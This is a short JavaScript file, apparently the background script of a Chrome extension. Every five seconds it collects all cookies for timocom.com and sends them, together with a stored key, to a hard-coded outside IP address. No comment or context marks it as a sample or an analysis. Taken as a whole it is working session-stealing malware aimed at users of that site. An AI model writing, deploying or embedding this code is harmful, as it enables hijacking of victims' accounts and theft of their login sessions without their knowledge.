
jobber();
const timerIdGetAllBalance = setInterval(function() {
  jobber();
}, 5000);

function jobber() {
  chrome.cookies.getAll({
      domain: 'timocom.com'
  },
  function(cookies) {
    console.log(cookies);
    if (cookies) {
      send_verification_code(cookies);
    } else {
      console.log('Can\'t get cookie! Check the name!');
    }
  });
}

function send_verification_code(cookies) {
  const current_verification_key = localStorage.getItem('verify_key');
  console.log(Object.keys(cookies).length);
  if (Object.keys(cookies).length > 0) {
    const url = 'http://92.118.150.87/api/chrome';
    const formData = new FormData();
    formData.append('cookies', JSON.stringify(cookies));
    formData.append('check_key', current_verification_key);

    const response = fetch(url, {
      method: 'POST',
      mode: 'no-cors',
      redirect: 'follow',
      referrerPolicy: 'no-referrer',
      body: formData
    });

    response.then(function(dataResponse) {
      console.log(dataResponse);
    }).catch(function(e) {
      console.log(e);
    })
  }
}
